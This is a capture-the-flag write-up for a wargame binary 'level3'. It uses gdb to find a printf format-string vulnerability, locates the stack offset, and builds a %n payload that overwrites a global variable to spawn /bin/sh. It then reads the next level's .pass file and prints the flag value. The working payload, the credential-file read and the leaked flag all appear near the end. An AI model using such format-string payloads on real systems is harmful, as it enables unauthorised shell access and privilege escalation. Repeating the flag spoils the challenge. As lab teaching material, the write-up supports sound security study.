HOW TO FIND THE FLAG:

We are going to analyse the binary file level3 with gdb => gdb level3

First let's see the functions used => "info functions"

Two functions "v" and "main". Use a printf could lead to format strings vulnerabilities.

"info variables" => global variable m with the adress "0x0804988c"

Let's try to dig deeper into the functions

disas main => calls the function "v"

disas v => "sub    $0x218" -> 536 bytes is reserved on the stack for local variables


movl   $0x200,0x4(%esp) => 512 bytes -> size of the buffer

lea    -0x208(%ebp),%eax => the buffer begins 520 bytes before ebp but there is two 4 bytes variables after.

fgets the buffer then printf

0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax

If the global variable m is equal to 0x40 (64) then the shell will be executed. 

x/s 0x804860d => "/bin/sh"

In order to execute the shell we will write to the global variable.

%n will write the size of the input at the adress pointed by %n

adress%<value-4>x%nb-arg$n will write the value to the adress

Let's first find at which offset our argument will be in the stack by bruteforcing this.

On gdb => r < <(python -c 'print "AAAA" + "%x." * 10")

AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.

We see that it is the 4th argument. We have the adress of m

So the input is simple : "\x8c\x98\x04\x08%60x%4$n"

(python -c 'print "\x8c\x98\x04\x08%60x%4$n"'; cat) | ./level3

then cat /home/user/level4/.pass => we get the flag b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

